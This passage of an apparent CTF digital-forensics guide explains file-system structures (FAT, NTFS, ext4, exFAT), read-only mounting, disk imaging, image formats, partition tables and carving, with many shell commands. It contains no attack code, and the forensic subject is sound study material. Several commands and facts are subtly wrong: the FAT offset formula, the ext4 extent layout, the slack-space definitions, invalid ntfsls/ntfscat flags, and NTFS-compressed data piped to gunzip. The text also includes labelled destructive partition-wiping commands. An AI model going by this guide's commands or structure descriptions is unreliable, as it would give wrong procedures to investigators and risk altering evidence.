# Locate the FAT on disk (typically starts after reserved sectors)
# For a file starting at cluster 5 with cluster size 4096 bytes:
# FAT offset = 512 (boot) + 512 (backup boot) + (cluster_number * 2 for FAT16)
hexdump -C /dev/sdX1 | grep -A 5 "sector offset"
```

[Inference] Tools like `testdisk`, `photorec`, or custom Python scripts using the `struct` module can automate FAT chain analysis by parsing the FAT table and reconstructing partial files from unlinked clusters.

### Root Directory Entries

In FAT12/16, the root directory is stored in a fixed location with a maximum entry limit. FAT32 stores the root directory in a regular cluster chain. Each directory entry is 32 bytes:

```
Bytes 0-7:     Filename (8 bytes, space-padded)
Bytes 8-10:    Extension (3 bytes, space-padded)
Byte 11:       File attributes
Bytes 12-13:   Reserved/creation milliseconds
Bytes 14-15:   Creation time
Bytes 16-17:   Creation date
Bytes 18-19:   Last access date
Bytes 20-21:   High word of first cluster (FAT32 only)
Bytes 22-23:   Write time
Bytes 24-25:   Write date
Bytes 26-27:   Low word of first cluster
Bytes 28-31:   File size (little-endian)
```

Extract directory entries from a mounted volume or disk image:

```bash
# Hexdump the root directory sector
hexdump -C -n 512 -s 33792 /dev/sdX1  # Adjust offset based on FS layout

# Using `fsck.vfat` verbose mode (read-only recommended for CTF)
fsck.vfat -v /dev/sdX1 2>&1 | grep -i "entry\|directory"
```

Deleted files retain their directory entries with the first byte set to 0xE5, allowing recovery by scanning for this signature.

### Deleted File Recovery

When a file is deleted, its directory entry is marked (first byte = 0xE5) but the FAT entries are not always cleared immediately. This allows recovery by:

1. Locating 0xE5 signatures in the root directory
2. Reconstructing the FAT chain from the starting cluster
3. Carving the file data from unallocated clusters

Command-line recovery:

```bash
# Using testdisk with automated recovery
testdisk /dev/sdX

# Or with photorec (command-line version)
photorec /d /path/to/recovery_dir /dev/sdX1

# Manual carving: extract clusters belonging to deleted file
# First, identify the starting cluster from the directory entry
dd if=/dev/sdX1 of=recovered_file.bin bs=4096 skip=STARTING_CLUSTER count=NUMBER_OF_CLUSTERS
```

For CTF scenarios where speed matters, use `scalpel` or `foremost` for signature-based carving:

```bash
foremost -i /dev/sdX1 -o /tmp/foremost_output -v
scalpel -i /dev/sdX1 -o /tmp/scalpel_output
```

---

## NTFS Architecture and Artifacts

NTFS (New Technology File System) is the default file system on modern Windows. It stores metadata in Master File Table (MFT) entries, each 1024 bytes, allowing for detailed forensic recovery.

### MFT Structure and Entry Analysis

The MFT is the central database of all files and directories. Each entry contains attributes that describe the file's properties, timestamps, and data location.

Locate and extract the MFT:

```bash
# The MFT is usually located in the first ~1% of the volume
# For a mounted NTFS volume:
fsstat /dev/sdX1 | grep -i "mft"

# Extract the MFT using ntfscp (from ntfs-3g):
ntfscp /dev/sdX1 -r '$MFT' /tmp/MFT_copy

# Or directly dump MFT bytes:
dd if=/dev/sdX1 of=/tmp/mft.bin bs=1024 skip=0 count=1000
```

Parse MFT entries using `mft-parser` or similar tools:

```bash
# Using sleuthkit's ntfscatcommand to extract specific files
icat -i ntfs /dev/sdX1 MFT_ENTRY_NUMBER > /tmp/file_content

# For bulk analysis, use python-ntfs or similar parsing libraries
python3 << 'EOF'
with open('/tmp/MFT_copy', 'rb') as f:
    mft_data = f.read()
    # Each entry is 1024 bytes starting at offset 0
    for i in range(0, len(mft_data), 1024):
        entry = mft_data[i:i+1024]
        # Check for MFT signature "FILE"
        if entry[:4] == b'FILE':
            print(f"Valid MFT entry at offset {i}")
EOF
```

### Attributes and Data Streams

NTFS attributes describe file properties. Standard attributes include:

- $STANDARD_INFORMATION (timestamps, permissions)
- $FILE_NAME (filename, parent directory reference)
- $DATA (actual file content)
- $BITMAP (cluster allocation map)
- $INDEX_ROOT and $INDEX_ALLOCATION (directory structures)

Alternate Data Streams (ADS) allow multiple data streams within a single file. This is frequently exploited in CTF scenarios for hiding data.

List attributes of a file:

```bash
# Using ntfsls with verbose output
ntfsls -i ntfs /dev/sdX1 -F | grep -A 5 "Filename"

# Extract specific attributes from MFT entry
ntfscat -i ntfs /dev/sdX1 -a $FILE_NAME -r 5 > /tmp/filename_attr

# Identify alternate data streams
ntfsls /mnt/ntfs_mount -R | grep ':'
find /mnt/ntfs_mount -name '*:*' 2>/dev/null
```

### Timestamp Analysis ($STANDARD_INFORMATION)

NTFS timestamps are stored as 64-bit FILETIME values (100-nanosecond intervals since January 1, 1601). These include:

- Created (C)
- Modified (M)
- Accessed (A)
- MFT Changed (ctime)

Extract timestamps from an MFT entry:

```bash
# Using analyzemft.py (part of various forensic toolkits)
analyzemft.py -f /tmp/MFT_copy -o /tmp/mft_timeline.csv

# Manual extraction with Python:
python3 << 'EOF'
import struct
from datetime import datetime, timedelta

def filetime_to_datetime(filetime):
    # Convert Windows FILETIME to Python datetime
    return datetime(1601, 1, 1) + timedelta(microseconds=filetime/10)

with open('/tmp/mft_entry', 'rb') as f:
    entry = f.read(1024)
    # $STANDARD_INFORMATION is typically at offset 0x30
    # Timestamps at specific offsets within the attribute
    created = struct.unpack('<Q', entry[0x30:0x38])[0]
    print(f"Created: {filetime_to_datetime(created)}")
EOF
```

### Shadow Copies and $UsnJrnl

NTFS Volume Shadow Copy Service (VSS) creates snapshots, and the Update Sequence Number Journal ($UsnJrnl) logs all file system changes. These artifacts are valuable for timeline reconstruction.

Extract shadow copies:

```bash
# Mount shadow copies on Linux using ntfs-3g
vssadmin list shadows  # Windows command; on Linux, check /mnt/.shadow_copy

# Using ntfsclone to extract complete volume for offline analysis
ntfsclone --save-image /dev/sdX1 /tmp/ntfs_image.dd

# Extract $UsnJrnl for timeline analysis
ntfscat /dev/sdX1 -a '$UsnJrnl' > /tmp/usnjournal.bin
```

Parse $UsnJrnl with custom tools or `UsnJrnl2csv`:

```bash
# [Inference] Tools like UsnJrnl2csv convert journal entries to timeline format
# Exact tool availability depends on forensic distribution
```

### Compressed and Encrypted Files

NTFS supports file-level compression (indicated in file attributes) and encryption (EFS - Encrypting File System). In CTF scenarios, compressed files can be extracted, but encrypted files require the appropriate key or certificate.

Identify and extract compressed files:

```bash
# Check file attributes for compression
ntfsinfo -i ntfs /dev/sdX1 -F | grep -i compress

# Extract compressed file data
ntfscat /dev/sdX1 -a $DATA /path/to/file | gunzip > /tmp/decompressed_file

# For NTFS-compressed files (different from gzip):
# Use sleuthkit or ntfs-3g utilities
```

---

## ext2/ext3/ext4 Structures

Linux ext file systems store metadata in inodes, with ext4 offering additional features like extents and journaling. These systems are common in CTF scenarios involving Linux forensics.

### Superblock and Group Descriptors

The superblock (typically at block 1, or block 0 for 1024-byte blocks) defines the file system layout. Group descriptors follow the superblock and describe block groups.

Dump and analyze the superblock:

```bash
# Using dumpe2fs to read superblock information
dumpe2fs /dev/sdX1 | head -50

# Hexdump the superblock directly
hexdump -C -n 1024 -s 1024 /dev/sdX1 | head -40

# Using debugfs for interactive examination
debugfs -R 'stats' /dev/sdX1
```

Key superblock fields for forensics:

- Magic number (0xef53)
- Block size (typically 4096 bytes)
- Inode size (typically 256 bytes in ext3/ext4)
- Creation time
- Mount count and max mount count
- Journal device (ext3/ext4)

### Inode Structure and Data Blocks

Each file is represented by an inode containing metadata (size, timestamps, permissions) and pointers to data blocks. ext4 uses extents instead of direct block pointers for efficiency.

Locate and examine inodes:

```bash
# List inode information for a file
ls -i /path/to/file  # Get inode number
stat /path/to/file   # Detailed inode data

# Using debugfs to examine inode content
debugfs -R 'inode <inode_number>' /dev/sdX1

# Extract inode data for manual parsing
# Inode size varies; in ext4, typically 256 bytes
dd if=/dev/sdX1 of=/tmp/inode.bin bs=1 skip=$((superblock_offset + inode_offset)) count=256
```

Decode inode timestamps (stored as seconds since epoch):

```bash
python3 << 'EOF'
from datetime import datetime
import struct

# Inode timestamps at specific offsets (ext4)
inode_data = open('/tmp/inode.bin', 'rb').read()

# atime at offset 0x08, mtime at 0x0c, ctime at 0x10, crtime at 0x80
mtime = struct.unpack('<I', inode_data[0x0c:0x10])[0]
print(f"Modified: {datetime.fromtimestamp(mtime)}")

# For ext4 with 64-bit timestamps
mtime_extended = struct.unpack('<I', inode_data[0x6c:0x70])[0]
print(f"Extended mtime: {mtime_extended}")
EOF
```

### Journal Analysis (ext3/ext4)

The journal records file system transactions, allowing recovery of deleted files and transaction reconstruction. Journals can be external (separate partition) or internal.

Locate and analyze the journal:

```bash
# Identify journal location
debugfs -R 'journal_info' /dev/sdX1

# Extract journal inode (typically inode 8)
debugfs -R 'inode 8' /dev/sdX1

# Dump journal data
dd if=/dev/sdX1 of=/tmp/journal.bin bs=4096 skip=JOURNAL_BLOCK count=JOURNAL_SIZE

# Analyze journal blocks using jcat (from sleuthkit)
jcat -i ext4 /dev/sdX1 BLOCK_NUMBER
```

Parse journal entries for transaction details:

```bash
# Using e2fsprogs journal parsing
e2image -r -j /dev/sdX1 /tmp/journal_extract

# Manual journal header parsing
hexdump -C -n 200 /tmp/journal.bin  # First 200 bytes contain journal header
```

### Deleted File Recovery

Deleted files leave recoverable artifacts in the file system:

- Inode remains allocated but marked as unused
- Data blocks are marked as free but retain content
- Directory entries may be recoverable

Recover deleted files:

```bash
# Using extundelete
extundelete --restore-all /dev/sdX1 --output-dir /tmp/recovered

# Manual recovery: search for inode signatures
debugfs -R 'ls -d' /dev/sdX1 | grep -i deleted

# Carve deleted file data from free blocks
dd if=/dev/sdX1 of=/tmp/unallocated.bin bs=4096 skip=FIRST_FREE_BLOCK count=NUMBER_OF_FREE_BLOCKS
```

### Extent-Based Allocation (ext4)

Extents group consecutive blocks into ranges, reducing inode overhead. Each extent describes a contiguous block range.

Extract extent information:

```bash
# Using debugfs to display file extents
debugfs -R 'extents <inode_number>' /dev/sdX1

# Parse extent tree manually
python3 << 'EOF'
# Extent entry structure (12 bytes):
# Bytes 0-3: block number (little-endian)
# Bytes 4-5: number of blocks (little-endian)
# Bytes 6-7: reserved / upper block number (ext4)

import struct
extents_data = open('/tmp/extents.bin', 'rb').read()
for i in range(0, len(extents_data), 12):
    entry = extents_data[i:i+12]
    block = struct.unpack('<I', entry[0:4])[0]
    count = struct.unpack('<H', entry[4:6])[0]
    print(f"Blocks {block} to {block+count-1} ({count} blocks)")
EOF
```

---

## exFAT and ReFS Basics

exFAT is commonly used on USB drives and SD cards, while ReFS (Resilient File System) is a modern Windows file system. Both appear in CTF scenarios but less frequently than FAT or NTFS.

### exFAT Structure

exFAT improves upon FAT32 with support for larger file sizes and better cluster allocation. It uses an allocation bitmap and free cluster tracking.

Extract and analyze exFAT metadata:

```bash
# fsck.exfat provides limited analysis
fsck.exfat -v /dev/sdX1

# Hexdump boot sector (similar to FAT but with exFAT-specific fields)
hexdump -C -n 512 /dev/sdX1

# Parse allocation bitmap for cluster analysis
# Bitmap offset is defined in boot sector; typically follows FAT region
dd if=/dev/sdX1 of=/tmp/bitmap.bin bs=512 skip=BITMAP_SECTOR count=BITMAP_SIZE
```

Key exFAT structures:

- Boot sector and backup boot sector
- Extended parameter region
- FAT (though simplified compared to FAT32)
- Allocation bitmap
- Cluster directory entries

[Inference] Recovery from exFAT volumes follows similar principles to FAT (carving, signature scanning) but with fewer tools available in standard forensic distributions.

### ReFS Basics

ReFS uses B+ tree structures instead of traditional allocation tables, offering better data integrity. File recovery is more complex due to the different architecture.

Examine ReFS volumes (mounted on Windows or compatible Linux):

```bash
# ReFS is primarily Windows-native; limited Linux support
# If mounted, use standard Linux tools:
fsstat /dev/sdX1 | grep -i "ReFS\|B+tree"

# Detailed metadata examination requires Windows tools or specialized parsers
# [Unverified] Tools like Arsenal Image Mounter or specialized ReFS parsers are needed for deep analysis
```

---

## File System Mounting (Read-Only)

In CTF scenarios, mounting file systems read-only prevents accidental modification and preserves forensic integrity.

### Read-Only Mount Configuration

Linux mounting options prioritize forensic integrity:

```bash
# Mount with read-only, no-atime, and noexec options
mount -o ro,noatime,noexec /dev/sdX1 /mnt/forensic_mount

# NTFS volume (using ntfs-3g)
mount -t ntfs-3g -o ro,noatime /dev/sdX1 /mnt/ntfs_mount

# exFAT volume
mount -t exfat -o ro /dev/sdX1 /mnt/exfat_mount

# ext4 volume (explicit read-only)
mount -t ext4 -o ro,noload /dev/sdX1 /mnt/ext4_mount
```

Key mount options:

- `ro`: Read-only
- `noatime`: Prevent access time updates (preserves original metadata)
- `noexec`: Prevent binary execution
- `noload`: For ext3/ext4, prevents journal replay
- `norecovery`: For ext file systems, skips consistency checks

### Using Loop Devices for Image Files

CTF scenarios often involve disk images (.img, .dd). Mount images via loop devices:

```bash
# Determine offset for specific partition
fdisk -l /path/to/image.dd
# Note the start sector and sector size

# Mount with loop device and offset
OFFSET=$((start_sector * sector_size))
mount -o loop,offset=$OFFSET,ro /path/to/image.dd /mnt/loop_mount

# Automated approach using parted or kpartx
kpartx -av /path/to/image.dd
mount -o ro /dev/mapper/loop0p1 /mnt/partition1
```

### Verification and Forensic Snapshots

After mounting, verify integrity and create snapshots for analysis:

```bash
# Calculate and verify MD5/SHA-256 hash of mounted file system
md5sum /dev/sdX1 > /tmp/fs_baseline.md5

# Use sleuthkit's fsstat for detailed statistics
fsstat -i ntfs /dev/sdX1

# Create a forensic image for offline analysis
dd if=/dev/sdX1 of=/tmp/forensic_image.dd bs=4096 conv=noerror,sync
md5sum /tmp/forensic_image.dd >> /tmp/fs_baseline.md5

# Log all operations for evidence chain
tee -a /tmp/forensic_log.txt << EOF
Mount time: $(date)
Device: /dev/sdX1
Mount point: /mnt/forensic_mount
Options: ro,noatime,noexec
Hash: $(md5sum /dev/sdX1 | awk '{print $1}')
EOF
```

### Linux vs Windows File System Differences in CTF Context

**Linux considerations:**

- Case-sensitive file names (ext2/ext3/ext4)
- POSIX permissions stored in inode
- Symlinks and hard links supported
- File deletion leaves recoverable artifacts in inode/journal

**Windows considerations:**

- Case-insensitive (but case-preserving) file names
- ACLs and NTFS permissions
- Alternate Data Streams for hidden content
- Recycle Bin and Volume Shadow Copies provide recovery points

**Analysis differences:**

- Linux: Use `debugfs`, `extundelete`, `fsck` tools
- Windows (NTFS): Use `ntfscp`, `ntfscat`, MFT analysis
- Mounted vs image-based: Images allow repeatable analysis without modifying original storage

This foundational understanding of file system structures enables efficient data recovery, timeline reconstruction, and artifact analysis during CTF competitions.

---

# Disk and Image Analysis

## Raw Disk Imaging

Raw disk imaging creates bit-for-bit copies of storage devices, preserving all data including deleted files, slack space, and unallocated clusters. This foundational skill ensures evidence integrity in forensic investigations and CTF challenges.

### dd - Data Duplicator

The `dd` command performs low-level copying at the block level without file system awareness.

**Basic syntax:**

```bash
dd if=/dev/sdX of=/path/to/image.raw bs=4M status=progress
```

**Parameter breakdown:**

- `if=` (input file): Source device or file
- `of=` (output file): Destination image file
- `bs=` (block size): Read/write block size (affects speed)
- `status=progress`: Shows real-time transfer statistics
- `conv=noerror,sync`: Continue on read errors, pad with zeros

**Common block sizes:**

- `bs=512` - Single sector (slow but thorough)
- `bs=4K` or `bs=4096` - Matches modern drive sector size
- `bs=4M` or `bs=4194304` - Faster for large drives
- `bs=1M` - Balanced speed/compatibility

**Imaging specific partitions:**

```bash
# Image entire disk
dd if=/dev/sda of=disk.raw bs=4M status=progress

# Image single partition
dd if=/dev/sda1 of=partition1.raw bs=4M status=progress

# Image with error handling
dd if=/dev/sda of=disk.raw bs=512 conv=noerror,sync status=progress
```

**Hashing during acquisition:**

```bash
# Create image and hash simultaneously
dd if=/dev/sda bs=4M status=progress | tee disk.raw | sha256sum > disk.raw.sha256
```

**Splitting large images:**

```bash
# Split into 2GB chunks
dd if=/dev/sda bs=4M status=progress | split -b 2G - disk.raw.
```

### dcfldd - Enhanced Forensic dd

`dcfldd` extends `dd` with built-in hashing, verification, and split output capabilities designed for forensic acquisition.

**Installation:**

```bash
apt-get install dcfldd
```

**Basic syntax:**

```bash
dcfldd if=/dev/sdX of=/path/to/image.raw hash=sha256 hashwindow=1G hashlog=hash.log bs=4M
```

**Key advantages over dd:**

- Built-in hashing (`hash=md5|sha1|sha256|sha512`)
- Multiple output streams (`of=file1 of=file2`)
- Automatic verification (`vf=` for verify file)
- Split output (`split=` for size-based splitting)
- Progress display without additional flags

**Practical examples:**

```bash
# Image with SHA256 hashing every 1GB
dcfldd if=/dev/sda of=evidence.raw hash=sha256 hashwindow=1G hashlog=evidence.hash bs=4M

# Image with multiple hashes
dcfldd if=/dev/sda of=evidence.raw hash=md5,sha256 hashlog=evidence.hash bs=4M

# Image with split output (2GB chunks)
dcfldd if=/dev/sda of=evidence.raw split=2G hash=sha256 hashlog=evidence.hash bs=4M

# Image with verification
dcfldd if=/dev/sda of=evidence.raw vf=evidence.raw hash=sha256 hashlog=evidence.hash bs=4M
```

**Multiple simultaneous outputs:**

```bash
# Write to two locations with hashing
dcfldd if=/dev/sda of=/mnt/backup1/image.raw of=/mnt/backup2/image.raw hash=sha256 hashlog=hashes.log
```

### Write Protection Considerations

[Inference] Hardware write blockers prevent accidental modification of evidence drives. Software write-blocking in Linux can be achieved through mounting options, though hardware solutions provide stronger guarantees in legal contexts.

**Software write-blocking:**

```bash
# Block device write operations (requires blockdev)
blockdev --setro /dev/sdX

# Verify read-only status
blockdev --getro /dev/sdX  # Returns 1 if read-only
```

## Image Formats

Forensic image formats vary in compression, metadata support, and compatibility. Understanding format characteristics guides tool selection in CTF scenarios.

### RAW Format

Raw images contain exact bit-for-bit copies without metadata or compression.

**Characteristics:**

- Extension: `.raw`, `.dd`, `.img`
- No compression or metadata
- Largest file size
- Universal compatibility
- Fastest acquisition/analysis
- Cannot verify integrity without external hash files

**Analysis:**

```bash
# Mount raw image (read-only)
mount -o ro,loop,offset=$((512*2048)) image.raw /mnt/analysis

# Calculate offset for partition 1
fdisk -l image.raw  # Note start sector
# offset = start_sector * sector_size (usually 512)

# Analyze with mmls (Sleuth Kit)
mmls image.raw
```

### E01 Format (Expert Witness Format)

E01 (EnCase Evidence File) provides compression, metadata, and integrity verification developed by Guidance Software.

**Characteristics:**

- Extensions: `.E01`, `.E02`, etc. (for split volumes)
- Supports compression (reduces size 40-60%)
- Embedded metadata (case info, acquisition details)
- Built-in CRC verification
- Industry standard in forensics
- Proprietary format with open-source implementations

**Creating E01 images:**

```bash
# Using ewfacquire (libewf-tools package)
apt-get install ewf-tools

ewfacquire /dev/sdX
# Interactive prompts for:
# - Case number
# - Description
# - Evidence number
# - Examiner name
# - Notes
# - Compression level (none/fast/best)
# - Segment file size

# Non-interactive creation
ewfacquire -t /path/to/output -C "Case001" -D "Suspect drive" -E "EVIDENCE-001" \
  -e "Examiner Name" -N "Acquisition notes" -c best -S 2G -u /dev/sdX
```

**Parameters:**

- `-t`: Target path (output basename without extension)
- `-C`: Case number
- `-D`: Description
- `-E`: Evidence number
- `-e`: Examiner name
- `-N`: Notes
- `-c`: Compression (none/fast/best)
- `-S`: Segment file size (2G recommended)
- `-u`: Unattended mode

**Mounting E01 images:**

```bash
# Using ewfmount
mkdir /mnt/ewf
ewfmount image.E01 /mnt/ewf

# Raw image appears as:
ls /mnt/ewf/ewf1  # Virtual raw device

# Mount the virtual device
mount -o ro,loop /mnt/ewf/ewf1 /mnt/analysis

# Cleanup
umount /mnt/analysis
umount /mnt/ewf
```

**Verifying E01 integrity:**

```bash
ewfverify image.E01
# Checks internal CRC and hash values
```

**Converting E01 to raw:**

```bash
ewfexport -t output.raw -f raw image.E01
```

### AFF Format (Advanced Forensic Format)

AFF provides open-source compression with metadata support, designed as an alternative to proprietary formats.

**Characteristics:**

- Extensions: `.aff`, `.afd` (segmented)
- Open standard (no licensing)
- Compression support
- Metadata storage
- Signature verification
- Less common than E01 in industry

**Creating AFF images:**

```bash
# Install afflib tools
apt-get install afflib-tools

# Create AFF image
affconvert -o output.aff /dev/sdX

# Create with compression
affconvert -o output.aff -X /dev/sdX
```

**Mounting AFF images:**

```bash
# Using affuse
mkdir /mnt/aff
affuse image.aff /mnt/aff

# Raw image appears as:
mount -o ro,loop /mnt/aff/image.aff.raw /mnt/analysis

# Cleanup
umount /mnt/analysis
fusermount -u /mnt/aff
```

**Converting between formats:**

```bash
# AFF to raw
affconvert -o output.raw image.aff

# Raw to AFF
affconvert -o output.aff input.raw

# E01 to AFF
ewfexport -t - -f raw image.E01 | affconvert -o output.aff -
```

**Metadata inspection:**

```bash
affinfo image.aff
# Displays acquisition time, hash values, compression ratio, etc.
```

## Partition Table Analysis

Partition tables define how storage space is organized into logical volumes. Understanding partition structures is essential for locating hidden data and recovering deleted partitions.

### MBR (Master Boot Record)

MBR resides in the first 512 bytes of a disk and supports up to four primary partitions or three primary plus one extended partition.

**Structure:**

- Bytes 0-445: Bootstrap code
- Bytes 446-509: Partition table (4 entries × 16 bytes)
- Bytes 510-511: Boot signature (0x55AA)

**Partition table entry format (16 bytes):**

- Byte 0: Boot flag (0x80 = bootable)
- Bytes 1-3: CHS start address (legacy)
- Byte 4: Partition type
- Bytes 5-7: CHS end address (legacy)
- Bytes 8-11: LBA start sector (4 bytes)
- Bytes 12-15: Number of sectors (4 bytes)

**Analyzing MBR:**

```bash
# Display MBR partition table
fdisk -l disk.raw

# Hexdump MBR
xxd -l 512 disk.raw | grep -A 4 "01b0"  # Partition table starts at 0x01BE (446)

# Using mmls (Sleuth Kit)
mmls disk.raw
# Output shows:
# - Slot number
# - Start sector
# - End sector
# - Length
# - Description

# Display detailed partition info
parted disk.raw print
```

**Common partition type codes:**

- `0x00`: Empty
- `0x05`: Extended
- `0x07`: NTFS/exFAT
- `0x0B`: FAT32 (CHS)
- `0x0C`: FAT32 (LBA)
- `0x82`: Linux swap
- `0x83`: Linux filesystem
- `0x8E`: Linux LVM
- `0xEE`: GPT protective MBR

**Manual MBR parsing:**

```bash
# Extract partition table
dd if=disk.raw bs=1 skip=446 count=64 of=partition_table.bin

# Hexdump partition entries
xxd partition_table.bin

# Calculate partition offset
# offset_bytes = LBA_start * 512
```

**Limitations:**

- Maximum 4 primary partitions
- 2TB disk size limit (32-bit LBA)
- No redundancy (single point of failure)
- No partition names or GUIDs

### GPT (GUID Partition Table)

GPT supersedes MBR with support for larger disks, more partitions, and built-in redundancy through backup headers.

**Structure:**

- LBA 0: Protective MBR (prevents legacy tools from corrupting GPT)
- LBA 1: Primary GPT header (92 bytes)
- LBA 2-33: Partition entries (128 bytes each, 128 entries default)
- LBA -33 to -2: Backup partition entries
- LBA -1: Backup GPT header

**GPT Header fields (LBA 1):**

- Bytes 0-7: Signature ("EFI PART")
- Bytes 8-11: Revision
- Bytes 12-15: Header size
- Bytes 16-19: CRC32 checksum
- Bytes 24-31: Current LBA
- Bytes 32-39: Backup LBA
- Bytes 40-47: First usable LBA
- Bytes 48-55: Last usable LBA
- Bytes 56-71: Disk GUID
- Bytes 72-79: Partition entries LBA
- Bytes 80-83: Number of partition entries
- Bytes 84-87: Size of partition entry

**Analyzing GPT:**

```bash
# Display GPT layout
gdisk -l disk.raw

# Detailed partition info
parted disk.raw print

# Using mmls
mmls disk.raw

# Display GPT header
dd if=disk.raw bs=512 skip=1 count=1 | xxd | head -20

# Verify GPT signature
dd if=disk.raw bs=8 skip=64 count=1 2>/dev/null | xxd
# Should show: "45 46 49 20 50 41 52 54" (EFI PART)
```

**Partition type GUIDs (common):**

- `C12A7328-F81F-11D2-BA4B-00A0C93EC93B`: EFI System Partition
- `EBD0A0A2-B9E5-4433-87C0-68B6B72699C7`: Microsoft Basic Data
- `0FC63DAF-8483-4772-8E79-3D69D8477DE4`: Linux filesystem
- `0657FD6D-A4AB-43C4-84E5-0933C84B4F4F`: Linux swap

**Recovery operations:**

```bash
# Rebuild GPT from backup
gdisk disk.raw
# Command: r (recovery menu)
# Command: c (load backup)
# Command: w (write)

# Verify CRC checksums
sgdisk -v disk.raw
```

**Advantages over MBR:**

- Supports 128 partitions (standard, extensible)
- 9.4 ZB maximum disk size (64-bit LBA)
- CRC32 checksums for integrity
- Backup header at disk end
- Unique GUIDs for disks and partitions
- Support for partition names

### Partition Table Manipulation

**Creating partition tables:**

```bash
# Create new GPT table (DESTRUCTIVE)
sgdisk -o /dev/sdX

# Create new MBR table (DESTRUCTIVE)
fdisk /dev/sdX
# Command: o (create DOS partition table)
# Command: w (write)
```

**Carving without partition tables:**

```bash
# Scan for filesystem signatures
fsstat -o 0 disk.raw  # Offset in sectors

# Bulk extractor can identify filesystem boundaries
bulk_extractor -o output_dir disk.raw
```

## Volume Analysis

Volume analysis examines filesystem structures within partitions to understand data organization and locate artifacts.

### Mounting Partitions from Images

**Calculating partition offsets:**

```bash
# Method 1: Using mmls
mmls disk.raw
# Note the "Start" column value (in sectors)

# Calculate byte offset
# offset = start_sector * sector_size
# Example: sector 2048, sector_size 512
# offset = 2048 * 512 = 1048576

# Method 2: Using fdisk
fdisk -l disk.raw
# Note "Start" sector

# Method 3: Using parted
parted disk.raw unit B print
# Shows offset directly in bytes
```

**Mounting with offset:**

```bash
# Mount specific partition
mount -o ro,loop,offset=1048576 disk.raw /mnt/part1

# Alternatively, using losetup
losetup -f -P --show disk.raw
# Creates /dev/loopX and partition devices /dev/loopXp1, /dev/loopXp2, etc.
mount -o ro /dev/loop0p1 /mnt/part1

# Cleanup
umount /mnt/part1
losetup -d /dev/loop0
```

### Filesystem Detection

**Identifying filesystem types:**

```bash
# Using file
file -s disk.raw
file -s /dev/loop0p1

# Using blkid
blkid disk.raw
blkid /dev/loop0p1

# Using fsstat (Sleuth Kit)
fsstat -o 2048 disk.raw  # Offset in sectors

# Using mmstat
mmstat disk.raw
```

**Common filesystem indicators:**

- **EXT2/3/4**: Magic bytes `53 EF` at offset 0x438 (1080 decimal) from partition start
- **NTFS**: Signature "NTFS " at offset 3
- **FAT16/32**: "FAT16" or "FAT32" string in boot sector
- **XFS**: Magic number `58 46 53 42` ("XFSB") at offset 0
- **Btrfs**: Magic `_BHRfS_M` at offset 0x10040

### Volume Shadow Copies (Windows)

Volume Shadow Copies (VSS) preserve point-in-time filesystem snapshots on NTFS volumes.

**Identifying VSS:**

```bash
# Using vshadowinfo (libvshadow)
apt-get install libvshadow-utils

vshadowinfo /dev/loop0p1
# or
vshadowinfo -o 1048576 disk.raw
```

**Mounting VSS:**

```bash
# Mount VSS storage
mkdir /mnt/vss
vshadowmount -o 1048576 disk.raw /mnt/vss

# List available snapshots
ls -la /mnt/vss/
# Shows vss1, vss2, etc.

# Mount specific snapshot
mkdir /mnt/snapshot1
mount -o ro,loop,show_sys_files,streams_interface=windows /mnt/vss/vss1 /mnt/snapshot1

# Cleanup
umount /mnt/snapshot1
umount /mnt/vss
```

### Logical Volume Manager (LVM)

LVM provides flexible volume management on Linux systems with support for snapshots and dynamic resizing.

**LVM structure:**

- Physical Volumes (PV): Physical disks or partitions
- Volume Groups (VG): Collections of PVs
- Logical Volumes (LV): Virtual partitions within VGs

**Analyzing LVM:**

```bash
# Scan for LVM metadata
losetup -f -P --show disk.raw
pvdisplay /dev/loop0p1
vgdisplay
lvdisplay

# Activate volume groups
vgchange -ay

# Mount logical volume
mount -o ro /dev/vg_name/lv_name /mnt/lvm

# Alternative: using kpartx
kpartx -av disk.raw
# Creates /dev/mapper/loopXpY devices
mount -o ro /dev/mapper/loop0p1 /mnt/analysis
```

### RAID Analysis

[Inference] RAID configurations stripe or mirror data across multiple drives, requiring reconstruction before analysis.

**Identifying RAID:**

```bash
# Check for mdadm metadata
mdadm --examine /dev/loop0
mdadm --examine disk1.raw

# Assemble RAID array (read-only)
mdadm --assemble --readonly --scan
```

**Common RAID levels in CTF:**

- RAID 0: Striping (requires all disks)
- RAID 1: Mirroring (any disk sufficient)
- RAID 5: Striping with parity (requires n-1 disks)

## Disk Sector Examination

Direct sector examination reveals low-level disk structures and hidden data bypassing filesystem abstraction.

### Reading Specific Sectors

**Using dd:**

```bash
# Read single sector (sector size 512)
dd if=disk.raw bs=512 skip=0 count=1 | xxd

# Read sector range (sectors 2048-2050)
dd if=disk.raw bs=512 skip=2048 count=3 | xxd

# Read MBR (first sector)
dd if=disk.raw bs=512 count=1 of=mbr.bin

# Read specific byte range
dd if=disk.raw bs=1 skip=1048576 count=4096 | xxd
```

### Hex Editors for Sector Analysis

**Using xxd:**

```bash
# Display specific offset
xxd -s 0x1000 -l 512 disk.raw  # -s offset, -l length

# Search for hex pattern
xxd disk.raw | grep "50 4b 03 04"  # ZIP header

# Binary search
xxd -p disk.raw | tr -d '\n' | grep -abo "504b0304"
```

**Using hexdump:**

```bash
# Canonical hex+ASCII
hexdump -C disk.raw | less

# Specific offset
hexdump -C -s 1048576 -n 512 disk.raw
```

**Using okteta (GUI):**

```bash
apt-get install okteta
okteta disk.raw
```

### Sector Signature Analysis

**File header signatures (magic bytes):**

Common signatures for CTF:

- **JPEG**: `FF D8 FF`
- **PNG**: `89 50 4E 47 0D 0A 1A 0A`
- **GIF**: `47 49 46 38` (GIF8)
- **PDF**: `25 50 44 46` (%PDF)
- **ZIP**: `50 4B 03 04`
- **GZIP**: `1F 8B`
- **ELF**: `7F 45 4C 46`
- **PE/EXE**: `4D 5A` (MZ)

**Searching for signatures:**

```bash
# Using binwalk
binwalk disk.raw
binwalk -e disk.raw  # Extract found files

# Using foremost
foremost -t all -i disk.raw -o foremost_output/

# Using scalpel
scalpel disk.raw -o scalpel_output/

# Manual grep for hex patterns
xxd disk.raw | grep "ff d8 ff"  # JPEG headers
```

### Slack Space Analysis

Slack space exists between the end of file data and the end of the allocated cluster, potentially containing residual data.

**File slack vs. RAM slack:**

- RAM slack: End of last sector to end of logical file
- File slack: End of logical file to end of cluster

**Analyzing slack:**

```bash
# Extract inode slack
icat -s image.raw inode_number > slack.bin

# Using blkls to extract unallocated blocks
blkls image.raw > unallocated.bin

# Search unallocated space
strings unallocated.bin | grep -i "password"
```

## Bad Sector Handling

Bad sectors may contain hardware failures or deliberately corrupted areas requiring specialized handling.

### Detecting Bad Sectors

**Using ddrescue:**

```bash
